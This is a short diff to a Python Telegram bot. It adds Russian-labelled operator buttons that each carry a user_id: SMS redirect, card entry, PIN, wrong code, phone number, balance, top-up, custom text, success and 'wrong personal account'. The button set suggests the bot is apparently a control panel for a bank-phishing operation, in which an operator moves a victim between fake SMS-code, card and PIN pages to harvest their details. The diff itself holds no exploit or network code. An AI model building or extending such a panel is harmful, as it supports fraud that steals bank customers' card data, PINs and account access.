@@ -16,11 +16,23 @@ pending_redirects = {}
 def get_menu_keyboard(user_id):
     return {
         "inline_keyboard": [
-            [{"text": "SMS", "callback_data": f"redirect_sms:{user_id}"}],  # Callback содержит user_id
+            [{"text": "SMS", "callback_data": f"redirect_sms:{user_id}"}],
 
             [{"text": "Пуш", "callback_data": f"push:{user_id}"},
              {"text": "Ввод карты", "callback_data": f"card:{user_id}"},
-             {"text": "PIN", "callback_data": f"pin:{user_id}"}]
+             {"text": "PIN", "callback_data": f"pin:{user_id}"}],
+
+            [{"text": "Лимиты", "callback_data": f"limits:{user_id}"},
+             {"text": "Неверный код", "callback_data": f"wrong_code:{user_id}"},
+             {"text": "Номер телефона", "callback_data": f"phone:{user_id}"}],
+
+            [{"text": "Свой текст/фото", "callback_data": f"custom_text:{user_id}"}],
+
+            [{"text": "Пополнение", "callback_data": f"topup:{user_id}"},
+             {"text": "Баланс", "callback_data": f"balance:{user_id}"}],
+
+            [{"text": "✅ Успех", "callback_data": f"success:{user_id}"},
+             {"text": "❌ Неверный ЛК", "callback_data": f"wrong_lk:{user_id}"}]
         ]
     }
 
@@ -75,7 +87,7 @@ def handle_callback():
     callback_data = callback_query.get("data")
     chat_id = callback_query["message"]["chat"]["id"]
 
-    # 📌 Разбираем callback_data (user_id:redirect_sms)
+    # 📌 Разбираем callback_data (redirect_sms:user_id)
     try:
         action, user_id = callback_data.split(":")
         user_id = int(user_id)
